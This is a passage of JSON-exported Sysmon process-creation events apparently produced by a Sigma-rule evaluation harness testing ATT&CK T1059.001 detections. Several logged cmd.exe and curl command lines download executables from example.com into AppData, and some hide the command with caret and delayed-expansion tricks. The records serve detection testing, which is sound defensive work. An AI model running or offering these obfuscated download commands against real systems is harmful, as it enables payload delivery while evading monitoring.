      "ProcessGuid": "20525DD1-D454-6A2E-E705-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:18:28.857880Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:18:28.799",
      "Version": 5
    },
    {
      "row_id": 129,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /v:on /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203632,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_024.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D46B-6A2E-0106-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:18:51.687808Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:18:51.651",
      "Version": 5
    },
    {
      "row_id": 130,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203634,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_024.evtx",
      "ParentCommandLine": "cmd.exe /v:on /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D46B-6A2E-0106-000000002C00",
      "ParentProcessId": 3004,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D46B-6A2E-0206-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:18:51.768303Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:18:51.742",
      "Version": 5
    },
    {
      "row_id": 131,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /\"V:ON\" /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203673,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_025.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D481-6A2E-1506-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:19:13.280112Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:19:13.246",
      "Version": 5
    },
    {
      "row_id": 132,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o !AppData!\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203674,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_025.evtx",
      "ParentCommandLine": "cmd.exe /\"V:ON\" /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D481-6A2E-1506-000000002C00",
      "ParentProcessId": 6980,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D481-6A2E-1606-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:19:13.338824Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:19:13.318",
      "Version": 5
    },
    {
      "row_id": 133,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /v:ON /C \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203719,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_026.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D495-6A2E-2C06-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:19:33.409899Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:19:33.374",
      "Version": 5
    },
    {
      "row_id": 134,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203720,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_026.evtx",
      "ParentCommandLine": "cmd.exe /v:ON /C \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D495-6A2E-2C06-000000002C00",
      "ParentProcessId": 9972,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D495-6A2E-2D06-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:19:33.462683Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:19:33.439",
      "Version": 5
    },
    {
      "row_id": 195,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"curl -o %%A^ppData%%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 207683,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_491.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E1C9-6A2E-F80D-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:15:53.440733Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:15:53.437",
      "Version": 5
    },
    {
      "row_id": 196,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  -o %%AppData%%\\test.exe http://[example.com/test.exe]()",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 207684,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_491.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl -o %A^ppData%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E1C9-6A2E-F80D-000000002C00",
      "ParentProcessId": 4224,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E1C9-6A2E-F90D-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:15:53.459513Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:15:53.455",
      "Version": 5
    },
    {
      "row_id": 197,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl -o %%A^ppData%%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 207727,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_492.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E1DE-6A2E-0E0E-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:16:14.994763Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:16:14.990",
      "Version": 5
    },
    {
      "row_id": 198,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  -o %%AppData%%\\test.exe http://[example.com/test.exe]()",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 207728,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_492.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl -o %A^ppData%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E1DE-6A2E-0E0E-000000002C00",
      "ParentProcessId": 12136,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E1DF-6A2E-0F0E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:16:15.016489Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:16:15.012",
      "Version": 5
    },
    {
      "row_id": 199,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl h^tt^ps://example.com/file.exe -o %%AP^PDATA%%\\file.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 207804,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_496.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E21E-6A2E-310E-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:17:18.906217Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:17:18.904",
      "Version": 5
    },
